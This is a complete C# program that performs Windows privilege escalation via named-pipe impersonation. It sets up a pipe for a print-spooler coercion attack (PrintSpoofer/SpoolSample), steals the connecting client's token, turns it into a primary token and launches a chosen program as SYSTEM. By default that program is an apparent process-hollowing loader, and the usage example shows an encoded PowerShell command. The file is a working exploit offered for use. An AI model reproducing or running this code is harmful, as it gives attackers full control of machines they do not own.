using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace ImpersonationPipe
{
    class Program
    {
        #region StructsAndEnums
        [StructLayout(LayoutKind.Sequential)]
        public struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public int Attributes;
        }

        public struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        public enum LogonFlags
        {
            LOGON_WITH_PROFILE = 0x00000001,
            LOGON_NETCREDENTIALS_ONLY = 0x00000002,
        }

        public enum ProcessCreationFlags
        {
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NEW_CONSOLE = 0x00000010,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_NO_WINDOW = 0x08000000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_SECURE_PROCESS = 0x00400000,
            CREATE_SEPARATE_WOW_VDM = 0x00000800,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            CREATE_SUSPENDED = 0x00000004,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            DEBUG_PROCESS = 0x00000001,
            DETACHED_PROCESS = 0x00000008,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            INHERIT_PARENT_AFFINITY = 0x00010000,
        }

        #endregion StructsAndEnums

        #region WinAPI
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);

        [DllImport("kernel32.dll")]
        static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);

        [DllImport("Advapi32.dll")]
        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread();

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);

        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll")]
        static extern uint GetSystemDirectory([Out] StringBuilder lpBuffer, uint uSize);

        [DllImport("userenv.dll", SetLastError = true)]
        static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool RevertToSelf();

        #endregion WinAPI

        static void Main(string[] args)
        {

            if (args.Length == 0)
            {
                Console.WriteLine("Usage: ImpersonationPipe.exe PIPENAME [\"Path to exe to launch as SYSTEM\"]");
                Console.WriteLine(@"Example For PrintSpoof: ImpersonationPipe.exe \\.\pipe\test\pipe\spoolss ""C:\Windows\System32\windowspowershell\v1.0\powershell.exe -enc blablabla=="" ");

                return;
            }

            string pipeName = args[0];
            /* Allow the user to supply path to an executable as an optional parameter, that will be launched as SYSTEM */
            string programToLaunch = args.Length == 2 ? args[1] : @"C:\Tasks\Hollowing.exe";


            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
            if (hPipe != IntPtr.Zero) Console.WriteLine($"NamedPipe server configured at: {pipeName}");
            else
            {
                Console.WriteLine("Couldn't Start a NamedPipe server");
                return;
            }

            string[] captureServer = pipeName.Split('\\');
            string serverName = Environment.MachineName;
            Console.WriteLine("Your Capture server for SpoolSample is: {0}/{1}/{2}", serverName, captureServer[3], captureServer[4]);


            /* Start listening and wait for connections */
            ConnectNamedPipe(hPipe, IntPtr.Zero);

            /* Impersonate the client and assigning the impersonating token to the current thread*/
            ImpersonateNamedPipeClient(hPipe);

            /* Open the current thread and get the impersonated token and get all acces to the token*/
            uint TOKEN_ALL_ACCESS = 0xF01FF;
            OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, out IntPtr hToken);

            /* Calling GetTokenInformation twice as recommended becuase we don't know the length to allocate in advance*/
            int TokenInfLength = 0;
            uint TOKENUSER = 1; // This is from TOKEN_INFORMATION_CLASS enum. retrieves the SID
            GetTokenInformation(hToken, TOKENUSER, IntPtr.Zero, TokenInfLength, out TokenInfLength);
            IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
            GetTokenInformation(hToken, TOKENUSER, TokenInformation, TokenInfLength, out TokenInfLength);

            /* Convert the binary SID to a readable string SID */
            // Create a new object from TOKEN_USER structure to hold the data
            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
            ConvertSidToStringSid(TokenUser.User.Sid, out IntPtr hSID);
            string sidstr = Marshal.PtrToStringAuto(hSID);
            Console.WriteLine($"Got SID: {sidstr}");

            /* Duplicate the Impersonation Token and convert it to a primary token to be use in a new process */
            uint FULL_ACCESS = 0xF01FF;
            uint SecurityImpersonation = 2; // per the SECURITY_IMPERSONATION_LEVEL enum
            DuplicateTokenEx(hToken, FULL_ACCESS, IntPtr.Zero, SecurityImpersonation, 1, out IntPtr primaryTokenFromImpersonation);

            /* Create Environemnts if the new process is to be launched as SYSTEM */
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.lpDesktop = @"WinSta0\Default";

            StringBuilder sbSystemDir = new StringBuilder(256);
            _ = GetSystemDirectory(sbSystemDir, 256);
            _ = CreateEnvironmentBlock(out IntPtr env, primaryTokenFromImpersonation, false);

            string ImpersonatedUser = WindowsIdentity.GetCurrent().Name;
            Console.WriteLine($"Current User is: {ImpersonatedUser}");
            
            /* Revert to our user and then Create a new process with the token we got from the Impersonation process */
            RevertToSelf();

            bool procWithToken = CreateProcessWithTokenW(primaryTokenFromImpersonation, (uint)LogonFlags.LOGON_WITH_PROFILE, null, programToLaunch,
                (uint)ProcessCreationFlags.CREATE_UNICODE_ENVIRONMENT,
                env, sbSystemDir.ToString(), ref si, out pi);

            string res = procWithToken ? "Process launched successfuly as " : "Failed to launch process as ";
            res += ImpersonatedUser;

            Console.WriteLine(res);
        }
    }
}
